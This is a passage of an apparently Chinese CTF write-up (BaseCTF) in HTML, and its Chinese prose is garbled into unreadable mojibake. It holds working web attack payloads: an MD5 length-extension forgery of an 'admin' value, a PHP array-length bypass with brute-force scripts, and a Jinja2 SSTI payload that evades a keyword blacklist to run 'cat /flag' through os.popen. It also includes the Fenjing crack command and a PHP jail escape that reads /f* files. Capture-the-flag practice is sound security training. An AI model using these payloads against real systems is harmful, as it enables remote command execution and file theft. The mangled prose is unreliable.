class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token constant">C0</span><span class="token operator">%</span><span class="token constant">E9</span><span class="token operator">%</span><span class="token constant">CC</span><span class="token operator">%</span><span class="token constant">C5</span><span class="token operator">%</span><span class="token number">03</span><span class="token operator">%</span><span class="token number">0</span>E<span class="token operator">%</span><span class="token number">0</span>E<span class="token operator">%</span><span class="token constant">D4</span><span class="token operator">%</span><span class="token number">5</span>D<span class="token operator">%</span><span class="token constant">BB</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token constant">B1</span><span class="token operator">%</span><span class="token constant">E4</span><span class="token operator">%</span><span class="token constant">AB</span><span class="token operator">%</span><span class="token constant">C0</span><span class="token operator">%</span><span class="token number">23</span>Vg<span class="token operator">%</span>A2u<span class="token operator">%</span><span class="token number">05</span><span class="token operator">%</span><span class="token number">95</span>Z<span class="token operator">%</span><span class="token number">1</span>B<span class="token operator">%</span><span class="token constant">CA</span><span class="token operator">%</span><span class="token number">80</span><span class="token operator">%</span><span class="token number">8</span>DS<span class="token operator">%</span><span class="token number">0</span>A<span class="token operator">%</span><span class="token number">92</span><span class="token operator">%</span><span class="token constant">EC</span><span class="token operator">%</span><span class="token constant">BC</span><span class="token operator">%</span><span class="token constant">A3</span><span class="token operator">%</span><span class="token number">08</span><span class="token operator">%</span><span class="token constant">F2</span><span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span>EDf<span class="token operator">%</span><span class="token constant">FA</span><span class="token operator">%</span><span class="token constant">EB</span><span class="token operator">-</span>ha<span class="token operator">%</span><span class="token number">88</span>S<span class="token operator">%</span><span class="token number">99</span><span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">95</span>E<span class="token operator">%</span><span class="token constant">F6</span><span class="token operator">%</span><span class="token constant">A1</span><span class="token operator">%</span><span class="token number">1</span>B<span class="token operator">%</span><span class="token number">5</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">21</span>y<span class="token operator">%</span><span class="token constant">A5</span><span class="token operator">%</span><span class="token number">12</span><span class="token operator">%</span><span class="token constant">E6</span><span class="token operator">%</span><span class="token constant">B5H</span><span class="token operator">%</span><span class="token constant">F9</span><span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span>F7Lci<span class="token operator">%</span><span class="token number">8</span>Dg<span class="token operator">%</span><span class="token constant">FC</span><span class="token operator">%</span><span class="token number">7</span>B8y<span class="token operator">%</span><span class="token constant">CD</span><span class="token operator">%</span><span class="token constant">A3</span><span class="token operator">%</span><span class="token number">8</span>E<span class="token operator">%</span><span class="token constant">E4</span><span class="token operator">%</span><span class="token constant">E7</span><span class="token operator">%</span><span class="token constant">D5</span><span class="token operator">%</span><span class="token number">0</span>F<span class="token operator">%</span><span class="token number">5</span>E<span class="token operator">%</span><span class="token constant">C9</span><span class="token operator">%</span><span class="token number">13</span><span class="token operator">%</span>C8n<span class="token operator">%</span><span class="token number">8</span>A<span class="token operator">%</span><span class="token number">86</span><span class="token operator">%</span><span class="token constant">F9</span><span class="token operator">%</span><span class="token number">9</span>FK_a<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span>C1h<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">B5</span><span class="token operator">%</span><span class="token number">0</span>Atg<span class="token operator">%</span><span class="token number">93</span><span class="token operator">%</span><span class="token number">5</span>E<span class="token operator">%</span><span class="token number">96</span><span class="token operator">%</span><span class="token number">95</span>g<span class="token operator">%</span><span class="token constant">F9T</span><span class="token operator">%</span><span class="token constant">A7</span><span class="token operator">%</span><span class="token number">02</span>K<span class="token operator">%</span><span class="token number">04</span><span class="token operator">%</span><span class="token number">8</span>F<span class="token operator">%</span><span class="token number">0</span>D<span class="token operator">%</span><span class="token constant">CA</span><span class="token operator">%</span><span class="token constant">C8</span><span class="token operator">%</span><span class="token constant">A8W</span><span class="token operator">%</span><span class="token number">1</span>E<span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token number">84</span><span class="token operator">%</span><span class="token number">9</span>FV<span class="token operator">%</span><span class="token constant">AB</span><span class="token operator">%</span><span class="token number">3</span>D<span class="token operator">%</span><span class="token constant">BCT</span></code></pre><p>ç¬¬å››å±‚ä¸ºå“ˆå¸Œæ‹“å±•æ”»å‡»</p><p>å‚è€ƒæ–‡ç« ï¼š</p><p><a href="https://wiki.wgpsec.org/knowledge/ctf/Hash-Leng-Extension.html">å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»</a></p><p><a href="https://luoingly.top/post/md5-length-extension-attack/">æµ…æ MD5 é•¿åº¦æ‰©å±•æ”»å‡» (MD5 Length Extension Attack)</a></p><p>ä½¿ç”¨å·¥å…·ï¼š</p><p><a href="https://github.com/luoingly/attack-scripts/blob/main/logic/md5-extension-attack.py">md5-extension-attack.py</a></p><p>å¯¹äºåŸå§‹æ–‡æœ¬çš„æµ‹é‡ï¼Œé¢˜ç›®ç»™å‡ºäº†<code>$_SESSION[&#39;random&#39;]</code>çš„æ„é€ æ–¹å¼</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">random_bytes</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">random_bytes</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">random_bytes</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span></span></code></pre><p><img src="MD5.png" loading="lazy"></p><pre class="language-php" data-language="php"><code class="language-php">name<span class="token operator">=</span><span class="token operator">%</span><span class="token number">80</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">03</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span>admin<span class="token operator">&amp;</span>md5<span class="token operator">=</span>f2f894abbd41c972a311332cfe76c6fe</code></pre><h4 id="ç©åŸç¥ç©çš„"><a href="#ç©åŸç¥ç©çš„" class="headerlink" title="ç©åŸç¥ç©çš„"></a>ç©åŸç¥ç©çš„</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">sizeof</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'len'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">sizeof</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">ys_open</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"é”™äº†ï¼å°±ä½ è¿˜æƒ³ç©åŸç¥ï¼ŸâŒâŒâŒ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">ys_open</span><span class="token punctuation">(</span><span class="token variable">$tip</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$tip</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">"æˆ‘è¦ç©åŸç¥"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"æˆ‘ä¸ç®¡ï¼Œæˆ‘è¦ç©åŸç¥ï¼ğŸ˜­ğŸ˜­ğŸ˜­"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">dumpFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">dumpFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'m'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">sizeof</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'m'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"å¯æ¶çš„QQäººï¼ğŸ˜¡ğŸ˜¡ğŸ˜¡"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'m'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'m'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token variable">$a</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">"100%"</span> <span class="token operator">||</span> <span class="token variable">$b</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">"love100%"</span> <span class="token operator">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"æŸç«™å´©äº†ï¼Ÿè‚¯å®šæ˜¯æŸå¿½æ‚ å¹²çš„ï¼ğŸ˜¡ğŸ˜¡ğŸ˜¡"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">include</span> <span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span>  <span class="token variable">$flag</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$ii</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$ii</span> <span class="token operator">&lt;</span> <span class="token function">sizeof</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$ii</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$flag</span><span class="token punctuation">[</span><span class="token variable">$ii</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token variable">$ii</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token variable">$ii</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>    <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </span></code></pre><p>ä¸çŸ¥é“<code>$array</code>çš„é•¿åº¦å¯ä»¥ç›´æ¥pyçˆ†ç ´</p><pre class="language-python" data-language="python"><code class="language-python">payload <span class="token operator">=</span> <span class="token string">"len[0]=1"</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"payload.txt"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span>        payload <span class="token operator">+=</span> <span class="token string-interpolation"><span class="token string">f"&amp;len[</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">]=1"</span></span></code></pre><p>åé¢ä¸¤ä¸ªå¾ˆå¥½ç»•è¿‡ï¼Œè®°å¾—<code>%</code>è¦urlç¼–ç </p><pre class="language-http" data-language="http"><code class="language-http">POST:len[0]=1&amp;len[1]=1&amp;len[2]=1&amp;len[3]=1&amp;len[4]=1&amp;len[5]=1&amp;len[6]=1&amp;len[7]=1&amp;len[8]=1&amp;len[9]=1&amp;len[10]=1&amp;len[11]=1&amp;len[12]=1&amp;len[13]=1&amp;len[14]=1&amp;len[15]=1&amp;len[16]=1&amp;len[17]=1&amp;len[18]=1&amp;len[19]=1&amp;len[20]=1&amp;len[21]=1&amp;len[22]=1&amp;len[23]=1&amp;len[24]=1&amp;len[25]=1&amp;len[26]=1&amp;len[27]=1&amp;len[28]=1&amp;len[29]=1&amp;len[30]=1&amp;len[31]=1&amp;len[32]=1&amp;len[33]=1&amp;len[34]=1&amp;len[35]=1&amp;len[36]=1&amp;len[37]=1&amp;len[38]=1&amp;len[39]=1&amp;len[40]=1&amp;len[41]=1&amp;len[42]=1&amp;len[43]=1&amp;len[44]=1&amp;m[0]=100%25&amp;m[1]=love100%2530bd7ce7de206924302499f197c7a966</code></pre><p>æœ€åæ ¹æ®ç»™å‡ºåŠ å¯†åçš„ flag æ•°ç»„ï¼ŒåŠ å¯†æµç¨‹æ˜¯æŠŠ flag æ¯â¼€ä¸ªå­—ç¬¦çš„ ASCII å€¼å’Œå½“å‰ç´¢å¼•å¼‚æˆ–å†å– md5 å€¼ï¼ŒæŒ¨ä¸ªè¾“å‡ºï¼Œè„šæœ¬çˆ†ç ´å³å¯ </p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> hashlib <span class="token keyword">import</span> md5enc <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"3295c76acbf4caaed33c36b1b5fc2cb1"</span><span class="token punctuation">,</span> <span class="token string">"26657d5ff9020d2abefe558796b99584"</span><span class="token punctuation">,</span> <span class="token string">"73278a4a86960eeb576a8fd4c9ec6997"</span><span class="token punctuation">,</span>       <span class="token string">"ec8956637a99787bd197eacd77acce5e"</span><span class="token punctuation">,</span> <span class="token string">"e2c420d928d4bf8ce0ff2ec19b371514"</span><span class="token punctuation">,</span> <span class="token string">"43ec517d68b6edd3015b3edc9a11367b"</span><span class="token punctuation">,</span>       <span class="token string">"ea5d2f1c4608232e07d3aa3d998e5135"</span><span class="token punctuation">,</span> <span class="token string">"c8ffe9a587b126f152ed3d89a146b445"</span><span class="token punctuation">,</span> <span class="token string">"a97da629b098b75c294dffdc3e463904"</span><span class="token punctuation">,</span>       <span class="token string">"a97da629b098b75c294dffdc3e463904"</span><span class="token punctuation">,</span> <span class="token string">"66f041e16a60928b05a7e228a89c3799"</span><span class="token punctuation">,</span> <span class="token string">"2838023a778dfaecdc212708f721b788"</span><span class="token punctuation">,</span>       <span class="token string">"65b9eea6e1cc6bb9f0cd2a47751a186f"</span><span class="token punctuation">,</span> <span class="token string">"9a1158154dfa42caddbd0694a4e9bdc8"</span><span class="token punctuation">,</span> <span class="token string">"698d51a19d8a121ce581499d7b701668"</span><span class="token punctuation">,</span>       <span class="token string">"f0935e4cd5920aa6c7c996a5ee53a70f"</span><span class="token punctuation">,</span> <span class="token string">"7f39f8317fbdb1988ef4c628eba02591"</span><span class="token punctuation">,</span> <span class="token string">"182be0c5cdcd5072bb1864cdee4d3d6e"</span><span class="token punctuation">,</span>       <span class="token string">"07e1cd7dca89a1678042477183b7ac3f"</span><span class="token punctuation">,</span> <span class="token string">"73278a4a86960eeb576a8fd4c9ec6997"</span><span class="token punctuation">,</span> <span class="token string">"182be0c5cdcd5072bb1864cdee4d3d6e"</span><span class="token punctuation">,</span>       <span class="token string">"9f61408e3afb633e50cdf1b20de6f466"</span><span class="token punctuation">,</span> <span class="token string">"e369853df766fa44e1ed0ff613f563bd"</span><span class="token punctuation">,</span> <span class="token string">"a5771bce93e200c36f7cd9dfd0e5deaa"</span><span class="token punctuation">,</span>       <span class="token string">"f7177163c833dff4b38fc8d2872f1ec6"</span><span class="token punctuation">,</span> <span class="token string">"67c6a1e7ce56d3d6fa748ab6d9af3fd7"</span><span class="token punctuation">,</span> <span class="token string">"b53b3a3d6ab90ce0268229151c9bde11"</span><span class="token punctuation">,</span>       <span class="token string">"e369853df766fa44e1ed0ff613f563bd"</span><span class="token punctuation">,</span> <span class="token string">"67c6a1e7ce56d3d6fa748ab6d9af3fd7"</span><span class="token punctuation">,</span> <span class="token string">"4c56ff4ce4aaf9573aa5dff913df997a"</span><span class="token punctuation">,</span>       <span class="token string">"da4fb5c6e93e74d3df8527599fa62642"</span><span class="token punctuation">,</span> <span class="token string">"c0c7c76d30bd3dcaefc96f40275bdc0a"</span><span class="token punctuation">,</span> <span class="token string">"a3f390d88e4c41f2747bfa2f1b5f87db"</span><span class="token punctuation">,</span>       <span class="token string">"c74d97b01eae257e44aa9d5bade97baf"</span><span class="token punctuation">,</span> <span class="token string">"70efdf2ec9b086079795c442636b55fb"</span><span class="token punctuation">,</span> <span class="token string">"70efdf2ec9b086079795c442636b55fb"</span><span class="token punctuation">,</span>       <span class="token string">"6ea9ab1baa0efb9e19094440c317e21b"</span><span class="token punctuation">,</span> <span class="token string">"7cbbc409ec990f19c78c75bd1e06f215"</span><span class="token punctuation">,</span> <span class="token string">"98f13708210194c475687be6106a3b84"</span><span class="token punctuation">,</span>       <span class="token string">"3c59dc048e8850243be8079a5c74d079"</span><span class="token punctuation">,</span> <span class="token string">"4e732ced3463d06de0ca9a15b6153677"</span><span class="token punctuation">,</span> <span class="token string">"02e74f10e0327ad868d138f2b4fdd6f0"</span><span class="token punctuation">,</span>       <span class="token string">"35f4a8d465e6e1edc05f3d8ab658c551"</span><span class="token punctuation">,</span> <span class="token string">"28dd2c7955ce926456240b2ff0100bde"</span><span class="token punctuation">,</span> <span class="token string">"43ec517d68b6edd3015b3edc9a11367b"</span><span class="token punctuation">]</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> md5<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>c <span class="token operator">^</span> i<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> enc<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">:</span>            flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></code></pre><h4 id="å¤è¯»æœº-SSTI"><a href="#å¤è¯»æœº-SSTI" class="headerlink" title="å¤è¯»æœº(SSTI)"></a>å¤è¯»æœº(SSTI)</h4><p>è¿‡æ»¤äº†å¾ˆå¤šä¸œâ»„ï¼Œâ½½ä¸”è¦æ±‚ä¼ â¼Šçš„å­—ç¬¦ä¸²å¿…é¡»ä»¥ BaseCTF{ å¼€å¤´ï¼Œè¿˜ä¼šæ£€æµ‹æ‹¬å·åŒ¹é…ã€‚è¿™â¾¥ä½¿â½¤â¼¯å…· Fenjingï¼Œæœ¬åœ°å…ˆæ­â¼€ä¸ªå¯ä»¥è¢« SSTI çš„æœåŠ¡å™¨ï¼Œç„¶åâ¼¿åŠ¨æŠŠè¿‡æ»¤çš„å­—ç¬¦ä¸²éƒ½è¯•å‡ºæ¥ï¼Œå†â½¤Fenjing è·‘ã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> random<span class="token keyword">from</span> jinja2 <span class="token keyword">import</span> Template<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> render_template_stringapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'&#123;&#123;'</span><span class="token punctuation">,</span> <span class="token string">'&#125;&#125;'</span><span class="token punctuation">,</span> <span class="token string">'__'</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token string">'*'</span><span class="token punctuation">,</span> <span class="token string">'+'</span><span class="token punctuation">,</span> <span class="token string">'-'</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token string">'"'</span><span class="token punctuation">,</span> <span class="token string">':'</span><span class="token punctuation">,</span> <span class="token string">'\\'</span><span class="token punctuation">,</span>             <span class="token string">'class'</span><span class="token punctuation">,</span> <span class="token string">'base'</span><span class="token punctuation">,</span> <span class="token string">'mro'</span><span class="token punctuation">,</span> <span class="token string">'init'</span><span class="token punctuation">,</span> <span class="token string">'global'</span><span class="token punctuation">,</span> <span class="token string">'builtin'</span><span class="token punctuation">,</span> <span class="token string">'config'</span><span class="token punctuation">,</span> <span class="token string">'request'</span><span class="token punctuation">,</span>             <span class="token string">'lipsum'</span><span class="token punctuation">,</span> <span class="token string">'cycler'</span><span class="token punctuation">,</span> <span class="token string">'url_for'</span><span class="token punctuation">,</span> <span class="token string">'os'</span><span class="token punctuation">,</span> <span class="token string">'pop'</span><span class="token punctuation">,</span> <span class="token string">'format'</span><span class="token punctuation">,</span> <span class="token string">'replace'</span><span class="token punctuation">,</span> <span class="token string">'reverse'</span>             <span class="token punctuation">]</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    name <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">,</span> <span class="token string">"guest"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">any</span><span class="token punctuation">(</span>i <span class="token keyword">in</span> name <span class="token keyword">for</span> i <span class="token keyword">in</span> blacklist<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"error"</span>    t <span class="token operator">=</span> Template<span class="token punctuation">(</span><span class="token string">"Hello "</span> <span class="token operator">+</span> name<span class="token punctuation">)</span>    <span class="token keyword">return</span> t<span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">)</span></code></pre><p>Payload</p><pre class="language-http" data-language="http"><code class="language-http">fenjing:python -m fenjing crack --url http://IP:5000/ --method GET --inputs namePOST:flag=BaseCTF&#123;%set in='_'~'_'~'i''nit'~'_'~'_'%&#125;&#123;%set gl='_'~'_'~'g''lobals'~'_'~'_'%&#125;&#123;%set bu='_'~'_'~'b''uiltins'~'_'~'_'%&#125;&#123;%set im='_'~'_'~'import'~'_'~'_'%&#125;&#123;%set da='OS'|lower%&#125;&#123;%set ca='%c%c%c%c%c%c%c%c%c'%(99,97,116,32,47,102,108,97,103)%&#125;&#123;%print joiner[in][gl][bu][im](da)['p''open'](ca)['read']()%&#125;</code></pre><h4 id="ez-php-jail"><a href="#ez-php-jail" class="headerlink" title="ez_php_jail"></a>ez_php_jail</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>Jail<span class="token punctuation">[</span>by<span class="token operator">.</span>Happy<span class="token operator">=</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">glob</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/f*"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h4 id="flagç›´æ¥è¯»å–ä¸å°±è¡Œäº†ï¼Ÿ-phpåŸç”Ÿç±»"><a href="#flagç›´æ¥è¯»å–ä¸å°±è¡Œäº†ï¼Ÿ-phpåŸç”Ÿç±»" class="headerlink" title="flagç›´æ¥è¯»å–ä¸å°±è¡Œäº†ï¼Ÿ(phpåŸç”Ÿç±»)"></a>flagç›´æ¥è¯»å–ä¸å°±è¡Œäº†ï¼Ÿ(phpåŸç”Ÿç±»)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'index.php'</span><span class="token 